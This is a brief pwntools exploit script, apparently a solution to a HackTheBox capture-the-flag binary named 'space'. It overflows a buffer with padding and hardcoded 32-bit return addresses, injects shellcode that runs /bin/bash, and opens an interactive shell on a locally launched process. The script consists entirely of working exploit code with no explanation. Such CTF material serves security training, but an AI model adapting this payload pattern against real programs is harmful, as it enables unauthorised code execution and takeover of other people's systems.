from pwn import *

HOST = "docker.hackthebox.eu"
p = process("./space")

payload1 = b'A' * 14 + p32(0x0804b827) + p32(0x08049217) + p32(0x010101ff) + b'A' * 5
payload2 = b'A' * 18 + p32(0x0804b816) + asm(shellcraft.execve('/bin/bash'))
payload = payload1 + payload2

p.recvuntil("> ")
p.sendline(payload)
p.interactive()
